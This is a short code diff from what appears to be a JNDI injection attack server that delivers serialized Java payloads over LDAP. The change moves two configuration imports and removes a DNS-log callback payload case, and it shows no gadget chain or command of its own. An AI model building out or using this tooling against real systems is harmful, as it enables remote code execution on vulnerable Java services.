@@ -13,8 +13,8 @@ import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 
 import static com.nu1r.jndi.gadgets.utils.Utils.getByte;
-import static com.nu1r.jndi.gadgets.utils.Config.IS_INHERIT_ABSTRACT_TRANSLET;
-import static com.nu1r.jndi.gadgets.utils.Config.URL_PATTERN;
+import static com.nu1r.jndi.gadgets.Config.Config.IS_INHERIT_ABSTRACT_TRANSLET;
+import static com.nu1r.jndi.gadgets.Config.Config.URL_PATTERN;
 import static org.fusesource.jansi.Ansi.ansi;
 
 @LdapMapping(uri = {"/deserialization"})
@@ -67,11 +67,6 @@ public class SerializedDataController implements LdapController {
             }
 
             switch (payloadType) {
-                case dnslog:
-                    String url = base.substring(base.lastIndexOf("/") + 1);
-                    System.out.println("[+] URL >> " + url);
-                    params = new String[]{url};
-                    break;
                 case nu1r:
                     String cmd = Util.getCmdFromBase(base);
                     int result1 = cmd.indexOf("-");
